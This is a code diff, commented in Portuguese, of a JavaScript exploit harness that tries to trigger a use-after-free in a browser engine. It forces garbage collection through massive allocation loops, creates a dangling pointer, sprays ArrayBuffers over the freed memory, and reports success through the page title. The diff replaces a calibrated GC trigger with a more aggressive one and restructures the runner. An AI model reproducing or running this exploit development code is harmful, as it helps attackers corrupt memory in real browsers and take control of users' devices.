@@ -28,7 +28,7 @@ function int64ToDouble(int64) {
 
 async function executeUAFTestChain() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_UAF_TEST;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Teste UAF Calibrado ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Hyper GC & Type Variation ---`, "test");
     
     let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
     let dangling_ref = null;
@@ -36,16 +36,16 @@ async function executeUAFTestChain() {
 
     try {
         logS3("--- FASE 1: Limpeza Agressiva Inicial do Heap ---", "subtest");
-        await triggerGC_Calibrated(); // <--- USA A NOVA FUNÇÃO CALIBRADA
+        await triggerGC_Hyper();
 
         logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
         dangling_ref = sprayAndCreateDanglingPointer();
         logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
         
         logS3("--- FASE 3: Múltiplas tentativas de forçar a Coleta de Lixo ---", "subtest");
-        await triggerGC_Calibrated(); // <--- USA A NOVA FUNÇÃO CALIBRADA
+        await triggerGC_Hyper();
         await PAUSE_S3(100);
-        await triggerGC_Calibrated(); // <--- USA A NOVA FUNÇÃO CALIBRADA
+        await triggerGC_Hyper();
         logS3("    Memória do objeto-alvo deve ter sido liberada.", "warn");
 
         logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
@@ -110,7 +110,6 @@ async function executeUAFTestChain() {
     }
 
     logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
-    // Retorna o resultado para o orquestrador
     return {
         errorOccurred: final_result.success ? null : final_result.message,
         main_result: final_result,
@@ -118,37 +117,18 @@ async function executeUAFTestChain() {
     };
 }
 
-// *** MODIFICADO ***
-// Esta função agora lê o valor do slider no index.html
-async function triggerGC_Calibrated() {
-    let megabytesToAllocate = 500; // Valor padrão
-    try {
-        // Pega o valor do input de texto
-        const inputEl = getElementById('gcMegabytesValue');
-        if (inputEl && inputEl.value) {
-            const val = parseInt(inputEl.value, 10);
-            if (!isNaN(val) && val > 0 && val <= 2000) { // Limite de 2GB por segurança
-                megabytesToAllocate = val;
-            }
-        }
-    } catch(e) {
-        logS3(`Erro ao ler valor de calibração: ${e.message}`, 'warn');
-    }
-
-    const bytesToAllocate = megabytesToAllocate * 1024 * 1024;
-    logS3(`    Acionando GC Calibrado: Tentando alocar ${megabytesToAllocate} MB...`, "info");
-    
+async function triggerGC_Hyper() {
+    logS3("    Acionando GC Agressivo (Hyper)...", "info");
     try {
         const gc_trigger_arr = [];
-        // Tenta alocar um único bloco grande
-        // Isto é mais rápido para forçar o GC do que o loop 'for'
-        gc_trigger_arr.push(new ArrayBuffer(bytesToAllocate));
-        logS3(`    Alocação de ${megabytesToAllocate} MB bem-sucedida (inesperado).`, 'warn');
+        for (let i = 0; i < 1000; i++) {
+            gc_trigger_arr.push(new ArrayBuffer(1024 * i)); 
+            gc_trigger_arr.push(new Array(1024 * i).fill(0));
+        }
     } catch (e) {
-        // Este é o resultado esperado
-        logS3(`    Memória esgotada durante a alocação (esperado).`, "info");
+        logS3("    Memória esgotada durante o GC Hyper (esperado).", "info");
     }
-    await PAUSE_S3(500); // Pausa para o GC rodar
+    await PAUSE_S3(500);
 }
 
 function sprayAndCreateDanglingPointer() {
@@ -170,35 +150,47 @@ function sprayAndCreateDanglingPointer() {
 }
 
 
-// --- runAllAdvancedTests (mesclado e simplificado) ---
+// --- runAllAdvancedTests.mjs (mesclado e renomeado) ---
+
+async function runUAFReproStrategy() {
+    const FNAME_RUNNER = "runUAFReproStrategy"; 
+    logS3(`==== INICIANDO Estratégia de Reprodução UAF (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
+    
+    const result = await executeUAFTestChain(); 
+
+    const module_name_for_title = FNAME_MODULE_UAF_TEST;
+
+    if (result.errorOccurred) {
+        logS3(`  RUNNER: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
+        document.title = `${module_name_for_title}: MainTest ERR!`;
+    } else if (result.uaf_success) {
+        logS3(`  RUNNER: Teste UAF: ${result.main_result.message}`, "vuln", FNAME_RUNNER);
+        document.title = `${module_name_for_title}: UAF SUCCESS!`;
+    } else {
+        logS3(`  RUNNER: Teste UAF falhou: ${result.main_result.message}`, "warn", FNAME_RUNNER);
+        document.title = `${module_name_for_title}: UAF Fail`;
+    }
+    
+    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
+    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    logS3(`==== Estratégia de Reprodução UAF (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
+}
 
 // Esta é a função principal exportada que o index.html chama
 export async function runAllAdvancedTests() {
     const FNAME_ORCHESTRATOR = `${FNAME_MODULE_UAF_TEST}_MainOrchestrator`;
     logS3(`==== INICIANDO Teste Principal (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
     
-    // O teste de conversão de tipo foi removido.
-    // Inicia diretamente a estratégia de UAF.
-    
-    const result = await executeUAFTestChain(); 
-    const module_name_for_title = FNAME_MODULE_UAF_TEST;
-
-    // Log do resultado
-    if (result.errorOccurred) {
-        logS3(`  RUNNER: Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_ORCHESTRATOR);
-        document.title = `${module_name_for_title}: MainTest ERR!`;
-    } else if (result.uaf_success) {
-        logS3(`  RUNNER: Teste UAF: ${result.main_result.message}`, "vuln", FNAME_ORCHESTRATOR);
-        document.title = `${module_name_for_title}: UAF SUCCESS!`;
-    } else {
-        logS3(`  RUNNER: Teste UAF falhou: ${result.main_result.message}`, "warn", FNAME_ORCHESTRATOR);
-        document.title = `${module_name_for_title}: UAF Fail`;
-    }
-    
-    logS3(`  Título da página final: ${document.title}`, "info", FNAME_ORCHESTRATOR);
+    // O teste de conversão de tipo foi REMOVIDO.
+    // O teste UAF agora executa imediatamente.
+    await runUAFReproStrategy();
     
     logS3(`\n==== Teste Principal (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
     
     const runBtn = getElementById('runIsolatedTestBtn'); 
     if (runBtn) runBtn.disabled = false;
+
+    if (document.title.includes(FNAME_MODULE_UAF_TEST) && !document.title.includes("SUCCESS") && !document.title.includes("Fail")) {
+        document.title = `${FNAME_MODULE_UAF_TEST} Done`;
+    }
 }
